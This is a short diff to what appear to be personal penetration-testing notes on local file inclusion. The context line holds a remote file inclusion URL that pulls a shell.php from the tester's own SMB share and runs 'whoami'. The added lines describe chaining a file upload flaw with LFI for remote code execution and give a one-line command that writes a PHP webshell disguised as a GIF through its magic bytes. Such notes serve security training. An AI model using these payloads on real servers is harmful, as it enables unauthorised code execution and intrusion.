@@ -154,4 +154,12 @@ http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoa
 
 LFI and File Uploads:
 
-If we can 
+If we also abuse a file upload vulnerability, combining with LFI this may grant us RCE if we are able to upload a shell to the file stash and include it with LFI
+
+Creating Malicious GIF:
+
+Below is a way to create a GIF file that is actually a webshell:
+```
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+We only need to remember to add GIF8 to the beginning then it would be fine (GIF8 is the magic byte of FI)
